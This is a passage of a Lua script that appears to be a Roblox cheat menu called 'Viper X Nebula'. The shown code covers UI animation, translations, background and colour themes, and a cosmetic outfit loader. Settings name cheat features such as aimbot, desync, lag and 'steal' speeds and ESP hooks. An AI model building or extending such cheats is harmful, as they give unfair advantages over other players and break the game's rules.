        tn(loadingRing, ot, Enum.EasingStyle.Quad, Enum.EasingDirection.In, {BackgroundTransparency = 1}):Play()
        tn(progressText, ot, Enum.EasingStyle.Quad, Enum.EasingDirection.In, {TextTransparency = 1}):Play()
        tn(dividerGlow, ot, Enum.EasingStyle.Quad, Enum.EasingDirection.In, {BackgroundTransparency = 1}):Play()
        tn(dividerLine, ot, Enum.EasingStyle.Quad, Enum.EasingDirection.In, {BackgroundTransparency = 1}):Play()
        tn(tapHint, ot, Enum.EasingStyle.Quad, Enum.EasingDirection.In, {TextTransparency = 1}):Play()
        tn(bgGrad, ot, Enum.EasingStyle.Quad, Enum.EasingDirection.In, {BackgroundTransparency = 1}):Play()
        tn(glowOverlay, ot, Enum.EasingStyle.Quad, Enum.EasingDirection.In, {BackgroundTransparency = 1}):Play()
        tn(skipBtn, ot, Enum.EasingStyle.Quad, Enum.EasingDirection.In, {BackgroundTransparency = 1, TextTransparency = 1}):Play()
        tn(skipStroke, ot, Enum.EasingStyle.Quad, Enum.EasingDirection.In, {Transparency = 1}):Play()
        tn(skipArrow, ot, Enum.EasingStyle.Quad, Enum.EasingDirection.In, {TextTransparency = 1}):Play()
        if introBlur and introBlur.Parent then
            tn(introBlur, ot + 0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In, {Size = 0}):Play()
        end
        for _, p in ipairs(particles) do
            if p.frame then
                tn(p.frame, ot, Enum.EasingStyle.Quad, Enum.EasingDirection.In, {BackgroundTransparency = 1}):Play()
            end
        end
    end)

    -- Final cleanup
    task.delay(D + 0.5, function()
        if not introActive then return end
        introActive = false
        if inputSkipConnection then
            inputSkipConnection:Disconnect()
            inputSkipConnection = nil
        end
        uf()
        pcall(function()
            if introBlur and introBlur.Parent then introBlur:Destroy() end
        end)
        if gui and gui.Parent then gui:Destroy() end
    end)

    -- Block main UI startup until the cinematic intro completes or is skipped.
    while gui and gui.Parent do
        task.wait(0.03)
    end
end

if playIntroEnabled then
    playIntroAnimation()
end
-- ================= END CHROME INTRO =================


local camera = Workspace.CurrentCamera

_G.ViperRunning = true
_G.ViperSession = (_G.ViperSession or 0) + 1
local _mySession = _G.ViperSession

local VIPER_LANGUAGE = "en"

local VIPER_TRANSLATIONS = {
    es = { ["RESET ALL SETTINGS"]="RESTABLECER TODO", ["SETTINGS RESET"]="AJUSTES RESTABLECIDOS", ["CONFIRM?"]="¿CONFIRMAR?", ["ERROR"]="ERROR", ["Reset All Keybinds"]="RESTABLECER TECLAS", ["RESET"]="RESTABLECER", ["Keybinds"]="TECLAS", ["Carry Mode"]="MODO CARGAR", ["Lagger Mode"]="MODO LAG", ["Auto Left"]="AUTO IZQUIERDA", ["Auto Right"]="AUTO DERECHA", ["Auto Bat"]="AUTO BATE", ["TP BAT"]="TP BATE", ["Insta Reset"]="REINICIO RÁPIDO", ["TP Down"]="TP ABAJO", ["Drop Brainrot"]="SOLTAR BRAINROT", ["Hide GUI"]="OCULTAR MENÚ", ["Normal Speed"]="VELOCIDAD NORMAL", ["Carry Speed"]="VELOCIDAD CARGAR", ["Current Mode"]="MODO ACTUAL", ["ACTIVATE"]="ACTIVAR" },
    pt = { ["RESET ALL SETTINGS"]="REDEFINIR TUDO", ["SETTINGS RESET"]="CONFIGURAÇÕES REDEFINIDAS", ["CONFIRM?"]="CONFIRMAR?", ["ERROR"]="ERRO", ["Reset All Keybinds"]="REDEFINIR TECLAS", ["RESET"]="REDEFINIR", ["Keybinds"]="TECLAS", ["Carry Mode"]="MODO CARREGAR", ["Auto Left"]="AUTO ESQUERDA", ["Auto Right"]="AUTO DIREITA", ["Hide GUI"]="OCULTAR MENU", ["Normal Speed"]="VELOCIDADE NORMAL", ["Carry Speed"]="VELOCIDADE CARREGAR", ["ACTIVATE"]="ATIVAR" },
    fr = { ["RESET ALL SETTINGS"]="RÉINITIALISER", ["SETTINGS RESET"]="PARAMÈTRES RÉINITIALISÉS", ["CONFIRM?"]="CONFIRMER ?", ["ERROR"]="ERREUR", ["Reset All Keybinds"]="RÉINITIALISER LES TOUCHES", ["RESET"]="RÉINITIALISER", ["Keybinds"]="RACCOURCIS", ["Carry Mode"]="MODE PORTER", ["Auto Left"]="AUTO GAUCHE", ["Auto Right"]="AUTO DROITE", ["Hide GUI"]="MASQUER LE MENU", ["Normal Speed"]="VITESSE NORMALE", ["Carry Speed"]="VITESSE PORTER", ["ACTIVATE"]="ACTIVER" },
    de = { ["RESET ALL SETTINGS"]="ALLES ZURÜCKSETZEN", ["SETTINGS RESET"]="EINSTELLUNGEN ZURÜCKGESETZT", ["CONFIRM?"]="BESTÄTIGEN?", ["ERROR"]="FEHLER", ["Reset All Keybinds"]="TASTEN ZURÜCKSETZEN", ["RESET"]="ZURÜCKSETZEN", ["Keybinds"]="TASTEN", ["Carry Mode"]="TRAGEMODUS", ["Auto Left"]="AUTO LINKS", ["Auto Right"]="AUTO RECHTS", ["Hide GUI"]="MENÜ AUSBLENDEN", ["Normal Speed"]="NORMALE GESCHWINDIGKEIT", ["Carry Speed"]="TRAGEGESCHWINDIGKEIT", ["ACTIVATE"]="AKTIVIEREN" },
}

function localizeViperInterface(root)
    local dictionary = VIPER_TRANSLATIONS[VIPER_LANGUAGE]
    if not dictionary or not root then return end
    for _, object in ipairs(root:GetDescendants()) do
        if object:IsA("TextLabel") or object:IsA("TextButton") then
            local source = object:GetAttribute("ViperSourceText") or object.Text
            object:SetAttribute("ViperSourceText", source)
            local translated = dictionary[source]
            if translated then object.Text = translated end
        end
    end
end

function viperTranslate(source)
    local dictionary = VIPER_TRANSLATIONS[VIPER_LANGUAGE]
    return (dictionary and dictionary[source]) or source
end

local _tick          = tick
local _clamp         = math.clamp
local _floor         = math.floor
local _abs           = math.abs
local _huge          = math.huge
local _sqrt          = math.sqrt
local _V3new         = Vector3.new
local _V3zero        = Vector3.zero
local _CFnew         = CFrame.new
local _CFlookAt      = CFrame.lookAt
local _RayParams_new = RaycastParams.new

local _GetPlayersCached
do
    local cache, cacheTime = nil, 0
    _GetPlayersCached = function()
        local now = _tick()
        if cache and now - cacheTime < 0.03 then return cache end
        cache = Players:GetPlayers()
        cacheTime = now
        return cache
    end
end

function waitForCharReady(char, timeout)
    timeout = timeout or 5
    local deadline = _tick() + timeout
    while (not char) or (not char.Parent)
          or (not char:FindFirstChild("HumanoidRootPart"))
          or (not char:FindFirstChildOfClass("Humanoid")) do
        if _tick() > deadline then return false end
        task.wait(0.05)
    end
    return true
end

NS = 60
CS = 29
LAGGER_SPEED = 15
LAGGER_CARRY_SPEED = 24.5
MEDUSA_COOLDOWN = 25
BAT_AIMBOT_SPEED = 58
selectedAimbotMode = "V1"
BYPASS_AIMBOT_SPEED = 60
CONFIG_FILE = "ViperDuels_" .. tostring(LP.UserId) .. ".json"
BAT_V2_HIT_DIST = 4.5
hiddenMobileButtons = {}
autoGrabScale = 1
DESYNC_SPEED = 47
DESYNC_STEAL_SPEED = 35
DESYNC_AIMBOT_SPEED = 37
_isDraggingButton = false

-- Keep the original background choices and their exact order/IDs.
backgroundIndex = 1
backgroundImages = {
    "88369503310562",
    "90631990302263",
    "109619268613730",
    "90453834580322",
    "82173577293417",
    "88369503310562",
    "80708025126373",
    "111949903851987",
    "135181794444219",
}

backgroundImageTransparency = 0.58 -- soften busy images so labels remain readable
selectedBackgroundTint = Color3.fromRGB(255, 255, 255)
backgroundMode = "Background " .. tostring(backgroundIndex)
backgroundSelectorLabel = nil
local backgroundLoadToken = 0
floatingButtonScale = 1
_floatingUIScales = {}

-- UI presentation preferences; supported mobile presets stay Rounded / Square / Circle / Hexagon.
uiLayoutSettings = uiLayoutSettings or {
    navLayout = "Top",          -- Top, Left, Right, or Bottom navigation
    panelShape = "Rounded",    -- Rounded or Square
    mobileShape = "Rounded",   -- Rounded, Square, Circle, Hexagon
}
-- Discard layout-position data from builds that allowed feature rows to be moved.
uiLayoutSettings.rowLocations = nil

local function preloadBackgroundTarget(imageObject)
    local resultStatus = nil
    local ok = pcall(function()
        ContentProvider:PreloadAsync({imageObject}, function(_, status)
            resultStatus = status
        end)
    end)
    -- Prefer the fetch result. Some clients report IsLoaded even for a failed
    -- fetch, which previously prevented the thumbnail fallback from running.
    if not ok then return false end
    if resultStatus ~= nil then
        return resultStatus == Enum.AssetFetchStatus.Success
    end
    return imageObject.IsLoaded == true
end

function applyBackgroundMode(mode)
    if mode == "None" then
        backgroundMode = "None"
    else
        local requestedIndex = tonumber(tostring(mode):match("Background (%d+)"))
        if requestedIndex then backgroundIndex = requestedIndex end
        backgroundIndex = math.clamp(tonumber(backgroundIndex) or 1, 1, #backgroundImages)
        backgroundMode = "Background " .. tostring(backgroundIndex)
    end

    if main then
        local noBackground = backgroundMode == "None"
        local bgImage = main:FindFirstChild("BackgroundImage")
        local incomingImage = main:FindFirstChild("BackgroundImageTransition")
        if bgImage and bgImage:IsA("ImageLabel") then
            backgroundLoadToken += 1
            local thisLoad = backgroundLoadToken
            local bgShade = main:FindFirstChild("BackgroundShade")
            if bgShade and bgShade:IsA("Frame") then
                bgShade.Visible = not noBackground
                if not noBackground then bgShade.BackgroundTransparency = 0.28 end
            end
            bgImage.BackgroundTransparency = 1
            if incomingImage and incomingImage:IsA("ImageLabel") then
                incomingImage.BackgroundTransparency = 1
                incomingImage.ZIndex = bgImage.ZIndex
            end

            if noBackground then
                -- Fade both wallpaper layers away instead of removing them abruptly.
                main.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
                main.BackgroundTransparency = 0
                local fadeInfo = TweenInfo.new(0.55, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
                TS:Create(bgImage, fadeInfo, {ImageTransparency = 1}):Play()
                if incomingImage and incomingImage:IsA("ImageLabel") then
                    TS:Create(incomingImage, fadeInfo, {ImageTransparency = 1}):Play()
                end
                task.delay(0.58, function()
                    if thisLoad ~= backgroundLoadToken or not bgImage.Parent then return end
                    bgImage.Image = ""
                    bgImage.Visible = false
                    if incomingImage and incomingImage.Parent then
                        incomingImage.Image = ""
                        incomingImage.Visible = false
                        incomingImage.ImageTransparency = 1
                    end
                end)
            else
                local imageId = tostring(backgroundImages[backgroundIndex] or ""):match("%d+")
                if imageId then
                    main.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
                    main.BackgroundTransparency = 1
                    bgImage.ZIndex = 1

                    -- Use the transition layer when available; otherwise fall back to a direct load.
                    local target = (incomingImage and incomingImage:IsA("ImageLabel")) and incomingImage or bgImage
                    target.Visible = true
                    target.ImageTransparency = 1
                    target.Image = "rbxthumb://type=Asset&id=" .. imageId .. "&w=768&h=432"

                    task.spawn(function()
                        local loaded = preloadBackgroundTarget(target)
                        if thisLoad ~= backgroundLoadToken or not target.Parent then return end
                        if not loaded then
                            target.Image = "rbxassetid://" .. imageId
                            loaded = preloadBackgroundTarget(target)
                        end
                        if thisLoad ~= backgroundLoadToken or not target.Parent then return end
                        if not loaded then
                            if target ~= bgImage then
                                target.Visible = false
                                target.Image = ""
                            end
                            warn("[VIPER X NEBULA] Background image failed to load. Check that the asset ID is public and permitted for this experience: " .. imageId)
                            return
                        end

                        local targetTransparency = math.clamp(tonumber(backgroundImageTransparency) or 0, 0, 1)
                        if target == bgImage then
                            -- Fallback for builds without the transition layer.
                            bgImage.Visible = true
                            bgImage.ImageTransparency = 1
                            TS:Create(bgImage, TweenInfo.new(0.75, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                                ImageTransparency = targetTransparency
                            }):Play()
                            return
                        end

                        -- Keep the current image visible until the incoming wallpaper is ready,
                        -- then cross-fade both for a smooth transition.
                        bgImage.Visible = true
                        bgImage.ImageTransparency = math.clamp(tonumber(bgImage.ImageTransparency) or targetTransparency, 0, 1)
                        target.Visible = true
                        target.ImageTransparency = 1
                        local fadeInfo = TweenInfo.new(0.85, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
                        local fadeIn = TS:Create(target, fadeInfo, {ImageTransparency = targetTransparency})
                        local fadeOut = TS:Create(bgImage, fadeInfo, {ImageTransparency = 1})
                        fadeIn:Play()
                        fadeOut:Play()
                        fadeIn.Completed:Wait()
                        if thisLoad ~= backgroundLoadToken or not bgImage.Parent or not target.Parent then return end

                        bgImage.Image = target.Image
                        bgImage.ImageTransparency = targetTransparency
                        bgImage.Visible = true
                        target.Image = ""
                        target.ImageTransparency = 1
                        target.Visible = false
                    end)
                else
                    if incomingImage and incomingImage:IsA("ImageLabel") then
                        incomingImage.Image = ""
                        incomingImage.Visible = false
                        incomingImage.ImageTransparency = 1
                    end
                    bgImage.Image = ""
                    bgImage.Visible = false
                    main.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
                    main.BackgroundTransparency = 0
                    warn("[VIPER X NEBULA] Invalid background asset ID at index " .. tostring(backgroundIndex))
                end
            end
        else
            warn("[VIPER X NEBULA] BackgroundImage layer not found under main frame")
        end
    end

    if backgroundSelectorLabel then backgroundSelectorLabel.Text = backgroundMode end
end

local COLOR_THEMES = {
    ["Green"]      = Color3.fromRGB(255, 110, 20),
    ["Neon Green"] = Color3.fromRGB(57, 255, 20),
    ["Dark Green"] = Color3.fromRGB(0, 180, 70),
    ["Pink"]       = Color3.fromRGB(255, 80, 180),
    ["Red"]        = Color3.fromRGB(255, 60, 60),
    ["Orange"]     = Color3.fromRGB(255, 140, 30),
    ["Yellow"]     = Color3.fromRGB(255, 220, 0),
    ["Purple"]     = Color3.fromRGB(180, 80, 255),
    ["Blue"]       = Color3.fromRGB(60, 150, 255),
    ["Cyan"]       = Color3.fromRGB(0, 220, 255),
    ["White"]      = Color3.fromRGB(220, 220, 230),
    ["Black"]      = Color3.fromRGB(100, 100, 110),
    ["Brown"]      = Color3.fromRGB(180, 100, 40),
    ["Gray"]       = Color3.fromRGB(160, 160, 175),
}

currentColorTheme = "Orange"
selectedColor = Color3.fromRGB(255, 110, 20)

function getThemeColor() return selectedColor or Color3.fromRGB(255, 110, 20) end

-- Theme tint is applied to background artwork layers so accent colors can tint image details.
local function applyBackgroundThemeTint()
    local color = getThemeColor()
    if not main then return end
    local image = main:FindFirstChild("BackgroundImage")
    if image and image:IsA("ImageLabel") then image.ImageColor3 = color:Lerp(Color3.fromRGB(255,255,255), 0.38) end
end

function viperGradient(c)
    return ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, c:Lerp(Color3.new(1,1,1), 0.55)),
        ColorSequenceKeypoint.new(0.45, c),
        ColorSequenceKeypoint.new(1.00, c:Lerp(Color3.new(0,0,0), 0.35)),
    })
end

function viperGradientSoft(c)
    return ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, c:Lerp(Color3.new(1,1,1), 0.75)),
        ColorSequenceKeypoint.new(0.50, c:Lerp(Color3.new(1,1,1), 0.25)),
        ColorSequenceKeypoint.new(1.00, c:Lerp(Color3.new(0,0,0), 0.15)),
    })
end

function viperGradientDark(c)
    return ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, c:Lerp(Color3.fromRGB(0,0,0), 0.35)),
        ColorSequenceKeypoint.new(0.55, c:Lerp(Color3.fromRGB(0,0,0), 0.65)),
        ColorSequenceKeypoint.new(1.00, c:Lerp(Color3.fromRGB(0,0,0), 0.80)),
    })
end

function applyViperGradientToLabel(label, c)
    if not label then return end
    local grad = label:FindFirstChildOfClass("UIGradient")
    if not grad then
        grad = Instance.new("UIGradient", label)
    end
    grad.Rotation = 0
    grad.Color = viperGradient(c)
end

local _lastThemeUpdate = 0
local _lastThemeColor = nil

function applyColorTheme(themeName)
    local color = COLOR_THEMES[themeName]
    if not color then return end
    currentColorTheme = themeName
    selectedColor = color
    updateAllUIThemeColors(color)
    saveAllSettings()
end

_uicStroke = nil
_uicAvatarStroke = nil
_uicHandle = nil
_uicLine = nil

function updateAllUIThemeColors(color)
    local now = _tick()
    if color == _lastThemeColor and now - _lastThemeUpdate < 0.1 then return end
    _lastThemeUpdate = now
    _lastThemeColor = color

    local function getDelay(obj)
        if not obj then return 0 end
        local p = obj
        for i=1,4 do
            if not p then break end
            if p:IsA("GuiObject") then return math.clamp(p.AbsolutePosition.Y / 800, 0, 1) * 0.7 end
            p = p.Parent
        end
        return 0
    end
    local function animC(obj, prop, val)
        if not obj then return end
        TS:Create(obj, TweenInfo.new(0.6, Enum.EasingStyle.Quart, Enum.EasingDirection.Out, 0, false, getDelay(obj)), {[prop] = val}):Play()
    end

    if progressFill then
        animC(progressFill, "BackgroundColor3", color)
        local grad = progressFill:FindFirstChildOfClass("UIGradient")
        if grad then
            grad.Color = viperGradient(color)
            grad.Rotation = 0
        end
    end
    if pbFrame then
        local border = pbFrame:FindFirstChild("OuterStroke") or pbFrame:FindFirstChildOfClass("UIStroke")
        if border then
            animC(border, "Color", color)
            local bg = border:FindFirstChild("PbBorderGrad")
            if bg then
                local dark = color:Lerp(Color3.fromRGB(0,0,0), 0.85)
                bg.Color = ColorSequence.new({
                    ColorSequenceKeypoint.new(0.00, color),
                    ColorSequenceKeypoint.new(0.30, dark),
                    ColorSequenceKeypoint.new(0.60, color),
                    ColorSequenceKeypoint.new(1.00, dark),
                })
            end
        end
        local fpsNeon = pbFrame:FindFirstChild("FPSNeon", true)
        if fpsNeon then animC(fpsNeon, "TextColor3", color) end
        local pingNeon = pbFrame:FindFirstChild("PingNeon", true)
        if pingNeon then animC(pingNeon, "TextColor3", color) end
        local divider = pbFrame:FindFirstChild("Divider", true)
        if divider and divider:IsA("Frame") then animC(divider, "BackgroundColor3", color) end
        local title = pbFrame:FindFirstChild("Title", true)
        if title and title:IsA("TextLabel") then
            animC(title, "TextColor3", color)
            local tg = title:FindFirstChildOfClass("UIGradient")
            if tg then tg.Color = viperGradient(color) end
        end
    end

    pcall(function()
        local char = LP and LP.Character
        local head = char and char:FindFirstChild("Head")
        local bb = head and head:FindFirstChild("ViperSpeedIndicator")
        local card = bb and bb:FindFirstChild("SpeedCard")
        if card then
            local glow = bb:FindFirstChild("SpeedGlow")
            if glow then animC(glow, "BackgroundColor3", color) end
            local accentBar = card:FindFirstChild("AccentBar")
            if accentBar then animC(accentBar, "BackgroundColor3", color) end
            local outerStroke = card:FindFirstChild("OuterStroke")
            if outerStroke then animC(outerStroke, "Color", color) end
            local modePill = card:FindFirstChild("ModePill")
            if modePill then
                animC(modePill, "BackgroundColor3", color)
                local st = modePill:FindFirstChild("ModeStroke")
                if st then animC(st, "Color", color) end
            end
        end
    end)

    if _uicStroke then animC(_uicStroke, "Color", color) end
    if _uicAvatarStroke then animC(_uicAvatarStroke, "Color", color) end
    if _uicHandle then animC(_uicHandle, "TextColor3", color) end
    if _uicLine then animC(_uicLine, "BackgroundColor3", color) end

    local function searchAndUpdateText(parent)
        if not parent then return end
        for _, child in ipairs(parent:GetDescendants()) do
            if child:IsA("TextLabel") then
                if child.Name == "DiscordText" then
                    animC(child, "TextColor3", Color3.fromRGB(255, 255, 255))
                elseif child.Name == "SpeedLabel" then
                    animC(child, "TextColor3", Color3.fromRGB(255, 255, 255))
                end
            end
            if child:IsA("UIStroke") then
                if child.Color == Color3.fromRGB(180, 180, 190) then animC(child, "Color", color) end
            end
        end
    end
    if gui then searchAndUpdateText(gui) end
    -- Also update head BillboardGui labels (not parented to gui)
    pcall(function()
        local char = LP and LP.Character
        local head = char and char:FindFirstChild("Head")
        if head then
            for _, bb in ipairs(head:GetChildren()) do
                if bb:IsA("BillboardGui") then
                    searchAndUpdateText(bb)
                end
            end
        end
    end)
    -- Also update expand arrow buttons in gui (their TextColor3 should match theme)
    if gui then
        for _, child in ipairs(gui:GetDescendants()) do
            if child.Name == "ExpandArrow" then
                animC(child, "TextColor3", color)
                local st = child:FindFirstChildOfClass("UIStroke")
                if st then animC(st, "Color", color) end
            end
            -- row strokes
            if child.Name == "SliderFill" then
                animC(child, "BackgroundColor3", color)
            end
            if child.Name == "RowStroke" or (child:IsA("UIStroke") and child.Parent and child.Parent.Name ~= "ToggleSwitch") then
                -- only update ones that look like row/border strokes (not pill strokes)
                -- skip - too risky to update all UIStrokes
            end
        end
    end
        for _, tab in ipairs(tabButtons or {}) do
        local isActive = tab:FindFirstChild("Underline") and tab.Underline.Visible
        if isActive then
            tab.TextColor3 = Color3.fromRGB(245, 245, 255)
            animC(tab, "BackgroundColor3", color)
            tab.BackgroundTransparency = 0.15
            local tg = tab:FindFirstChild("TabBgGrad")
            if tg then tg.Color = viperGradient(color) end
        else
            tab.TextColor3 = Color3.fromRGB(150, 150, 165)
            tab.BackgroundColor3 = Color3.fromRGB(26, 26, 34)
            tab.BackgroundTransparency = 1
        end
        local ul = tab:FindFirstChild("Underline")
        if ul then animC(ul, "BackgroundColor3", color) end
        local s = tab:FindFirstChild("TabStroke")
        if s then animC(s, "Color", color) end
    end
    if _G.__ViperRefreshESPTheme then pcall(_G.__ViperRefreshESPTheme, color) end
    if main then
        local titleFrame = main:FindFirstChild("Frame")
        if titleFrame then
            for _, child in ipairs(titleFrame:GetDescendants()) do
                if child:IsA("UIStroke") and child.Color == Color3.fromRGB(180, 180, 190) then
                    animC(child, "Color", color)
                end
            end
        end
    end
    if colorSelectorLabel then
        colorSelectorLabel.Text = currentColorTheme
        animC(colorSelectorLabel, "TextColor3", color)
    end

    if _G._viperStealSlide then
        animC(_G._viperStealSlide, "BackgroundColor3", color)
        local sg = _G._viperStealSlide:FindFirstChildOfClass("UIGradient")
        if sg then sg.Color = viperGradient(color) end
        local ss = _G._viperStealSlide:FindFirstChildOfClass("UIStroke")
        if ss then animC(ss, "Color", color) end
    end

    if miniBtn then
        local stroke = miniBtn:FindFirstChildOfClass("UIStroke")
        if stroke then animC(stroke, "Color", color) end
    end

    -- Update main rotating border gradient color
    if main then
        local ms = main:FindFirstChild("MainStroke")
        local mg = ms and ms:FindFirstChild("RotatingBorderGrad")
        if mg then
            local dark = color:Lerp(Color3.fromRGB(0,0,0), 0.92)
            mg.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0.00, color:Lerp(Color3.fromRGB(255, 120, 28), 0.35)),
                ColorSequenceKeypoint.new(0.50, dark),
                ColorSequenceKeypoint.new(1.00, color:Lerp(Color3.fromRGB(255, 120, 28), 0.35)),
            })
        end
    end

    -- Update all active ToggleSwitches
    if gui then
        for _, sw in ipairs(gui:GetDescendants()) do
            if sw.Name == "ToggleSwitch" then
                local ps = sw:FindFirstChild("PillStroke")
                local statusLbl = sw:FindFirstChild("StatusLabel")
                local knob = sw:FindFirstChild("Knob")
                if statusLbl and statusLbl.Text == "ON" then
                    if ps then animC(ps, "Color", color) end
                    if knob then
                        animC(knob, "BackgroundColor3", color)
                        local ks = knob:FindFirstChild("KnobStroke")
                        if ks then animC(ks, "Color", Color3.fromRGB(255,255,255)) end
                    end
                    animC(sw, "BackgroundColor3", color:Lerp(Color3.fromRGB(0,0,0), 0.88))
                    if statusLbl then animC(statusLbl, "TextColor3", color) end
                end
            end
            -- Update expand arrow buttons
            if sw.Name == "ExpandArrow" then
                animC(sw, "TextColor3", color)
                local st = sw:FindFirstChildOfClass("UIStroke")
                if st then animC(st, "Color", color) end
            end
        end
        -- Update all row strokes (subtle border that uses theme color)
        for _, f in ipairs(gui:GetDescendants()) do
            if f:IsA("Frame") and f.Name ~= "ToggleSwitch" and f.Name ~= "Knob" then
                local rs = f:FindFirstChildOfClass("UIStroke")
                if rs and rs.Name ~= "PillStroke" and rs.Name ~= "KnobStroke" and rs.Name ~= "OuterStroke" and rs.Name ~= "MainStroke" then
                    if rs.Thickness <= 1.5 and rs.Transparency >= 0.3 then
                        animC(rs, "Color", color)
                    end
                end
            end
        end
    end

    -- Update all MobilePanel buttons
    if MobilePanel then
        for _, btn in ipairs(MobilePanel:GetChildren()) do
            if btn:IsA("TextButton") then
                paintFloatingBtn(btn, btn:GetAttribute("MobActive") == true)
            end
        end
    end
end


local HOMERO_CFG = {
    body = { 10725826963, 86500008, 86500054, 86500036, 86500064, 86500078 },
    aplicarCuerpo = true,
    items = {
        { id = 103227869700418, offset = _CFnew(0,0,0) },
        { id = 84952305140948,   offset = _CFnew(0,0,0) },
        { id = 122465238537030,  offset = _CFnew(0,0,0) },
    },
    shirt = nil,
    pants = "rbxassetid://78591690208112",
    skinColor = Color3.fromRGB(234,184,146),
    headColor = Color3.fromRGB(0,0,0),
}

local TAG = "LocalOutfit_"

function loadObjects(id)
    local ok, res = pcall(function()
        return game:GetObjects("rbxassetid://" .. tostring(id))
    end)
    if ok and typeof(res) == "table" and #res > 0 then return res end
    ok, res = pcall(function()
        return game:GetService("InsertService"):LoadAsset(id)
    end)
    if ok and res then return { res } end
    return nil
end

function collectParts(objs)
    local out = {}
    for _, o in ipairs(objs) do
        if o:IsA("BasePart") then out[#out + 1] = o end
        for _, d in ipairs(o:GetDescendants()) do
            if d:IsA("BasePart") then out[#out + 1] = d end
        end
    end
    return out
end

function findAtt(char, name)
    for _, p in ipairs(char:GetDescendants()) do
        if p:IsA("Attachment") and p.Name == name and p.Parent:IsA("BasePart") then
            return p
        end
    end
end

function applyBody(char)
    local total = 0
    for _, id in ipairs(HOMERO_CFG.body) do
        local objs = loadObjects(id)
        if objs then
            for _, mp in ipairs(collectParts(objs)) do
                local orig = char:FindFirstChild(mp.Name)
                if orig and orig:IsA("BasePart") then
                    local c = mp:Clone()
                    c.Name = TAG .. "body_" .. mp.Name
                    c.CanCollide = false
                    c.Anchored = false
                    c.Massless = true
                    c.Size = orig.Size
                    c.CFrame = orig.CFrame
                    c.Parent = char
                    local w = Instance.new("WeldConstraint")
                    w.Part0 = orig
                    w.Part1 = c
                    w.Parent = c
                    if orig:GetAttribute("ViperOutfitOriginalTransparency") == nil then
                        orig:SetAttribute("ViperOutfitOriginalTransparency", orig.Transparency)
                    end
                    orig.Transparency = 1
                    total = total + 1
                end
            end
            for _, o in ipairs(objs) do pcall(function() o:Destroy() end) end
        end
    end
    return total
end

function attachItem(char, entry)
    local objs = loadObjects(entry.id)
    if not objs then return false end

    local handle
    for _, p in ipairs(collectParts(objs)) do
        if p.Name == "Handle" then handle = p; break end
        if not handle then handle = p end
    end
    if not handle then
        for _, o in ipairs(objs) do pcall(function() o:Destroy() end) end
        return false
    end

    local H = handle:Clone()
    for _, o in ipairs(objs) do pcall(function() o:Destroy() end) end

    H.Name = TAG .. "item_" .. tostring(entry.id)
    H.CanCollide = false
    H.Anchored = false
    H.Massless = true

    local wrap = H:FindFirstChildWhichIsA("WrapLayer")
    local target, c0, c1

    if wrap then
        target = char:FindFirstChild("UpperTorso")
              or char:FindFirstChild("Torso")
              or char:FindFirstChild("HumanoidRootPart")
        c0 = entry.offset or _CFnew()
        c1 = _CFnew()
    else
        local hAtt = H:FindFirstChildOfClass("Attachment")
        local bAtt = hAtt and findAtt(char, hAtt.Name)
        if bAtt then
            target = bAtt.Parent
            c0 = bAtt.CFrame * (entry.offset or _CFnew())
            c1 = hAtt.CFrame
        else
            target = char:FindFirstChild("Head")
            c0 = entry.offset or _CFnew(0, 1.4, 0)
            c1 = _CFnew()
        end
    end

    if not target then H:Destroy(); return false end

    H.CFrame = target.CFrame * c0 * c1:Inverse()
    H.Parent = char

    local w = Instance.new("Weld")
    w.Part0 = target
    w.Part1 = H
    w.C0 = c0
    w.C1 = c1
    w.Parent = H
    return true
end

function applyHomeroOutfit(char)
    if not char then char = LP.Character end
    if not char then return end
    char:WaitForChild("Humanoid", 10)
    char:WaitForChild("Head", 10)
    task.wait(0.4)

    for _, d in ipairs(char:GetChildren()) do
        if d.Name:sub(1, #TAG) == TAG then pcall(function() d:Destroy() end) end
    end

    if HOMERO_CFG.skinColor then
        local bc = char:FindFirstChildWhichIsA("BodyColors") or Instance.new("BodyColors")
        bc.HeadColor3 = HOMERO_CFG.headColor or HOMERO_CFG.skinColor
        bc.TorsoColor3 = HOMERO_CFG.skinColor
        bc.LeftArmColor3, bc.RightArmColor3 = HOMERO_CFG.skinColor, HOMERO_CFG.skinColor
        bc.LeftLegColor3, bc.RightLegColor3 = HOMERO_CFG.skinColor, HOMERO_CFG.skinColor
        bc.Parent = char
    end

    for _, a in ipairs(char:GetChildren()) do
        if a:IsA("Accessory") then
            local h = a:FindFirstChild("Handle")
            if h then h.Transparency = 1 end
        end
    end

    if HOMERO_CFG.shirt then
        local s = char:FindFirstChildWhichIsA("Shirt") or Instance.new("Shirt")
        s.Name = "Shirt"
        s.ShirtTemplate = HOMERO_CFG.shirt
        s.Parent = char
    end
    if HOMERO_CFG.pants then
        local p = char:FindFirstChildWhichIsA("Pants") or Instance.new("Pants")
        p.Name = "Pants"
        p.PantsTemplate = HOMERO_CFG.pants
        p.Parent = char
    end
    if HOMERO_CFG.aplicarCuerpo then applyBody(char) end
    for _, e in ipairs(HOMERO_CFG.items) do attachItem(char, e) end
end

local _originalAppearance = nil

function captureOriginalAppearance(char)
    if not char or _originalAppearance then return end
    local data = {
        bodyColors = nil,
        shirt = nil,
        pants = nil,
        headMesh = nil,
        headTexture = nil,
    }
    local bc = char:FindFirstChildWhichIsA("BodyColors")
    if bc then
        data.bodyColors = {
            head = bc.HeadColor3,
            torso = bc.TorsoColor3,
            leftArm = bc.LeftArmColor3,
            rightArm = bc.RightArmColor3,
            leftLeg = bc.LeftLegColor3,
            rightLeg = bc.RightLegColor3,
        }
    end
    local sh = char:FindFirstChildWhichIsA("Shirt")
    if sh then data.shirt = sh.ShirtTemplate end
    local pa = char:FindFirstChildWhichIsA("Pants")
    if pa then data.pants = pa.PantsTemplate end
    local head = char:FindFirstChild("Head")
    if head then
        local sm = head:FindFirstChildWhichIsA("SpecialMesh")
        if sm and sm.MeshType == Enum.MeshType.FileMesh then
            data.headMesh = sm.MeshId
            data.headTexture = sm.TextureId
        end
    end
    _originalAppearance = data
end

function clearPreviousOutfitAssets(char)
    if not char then return end
    for _, child in ipairs(char:GetChildren()) do
